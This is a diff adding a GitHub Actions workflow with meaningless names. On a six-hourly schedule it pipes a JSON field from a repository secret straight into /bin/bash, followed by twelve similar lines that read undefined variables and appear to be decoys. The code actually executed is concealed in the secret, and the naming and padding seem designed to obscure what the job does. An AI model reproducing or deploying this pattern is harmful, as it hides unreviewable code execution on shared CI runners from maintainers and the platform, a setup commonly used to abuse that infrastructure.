@@ -1,0 +1,28 @@
+name: niningkerangzijiyi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: niningkerangzijiyi
+        env:
+          iumvs31: ${{ secrets.iumvs31 }}
+        run: |
+          echo $iumvs31 | jq -r .tty31 | /bin/bash
+          echo $ew77948 | jq -r .i05526 | /bin/bash
+          echo $ivclm65614 | jq -r .pf5868 | /bin/bash
+          echo $l4 | jq -r .l67992 | /bin/bash
+          echo $ybaf2 | jq -r .s1 | /bin/bash
+          echo $ilvcp9217 | jq -r .kad2 | /bin/bash
+          echo $jeoc6538 | jq -r .h78386 | /bin/bash
+          echo $pqyf618 | jq -r .djj32500 | /bin/bash
+          echo $skmot780 | jq -r .lfcz024 | /bin/bash
+          echo $hr49 | jq -r .rxazf2682 | /bin/bash
+          echo $jd30137 | jq -r .nsvqk68 | /bin/bash
+          echo $uugw7 | jq -r .ct65 | /bin/bash
+          echo $qeufx170 | jq -r .ye664 | /bin/bash
+
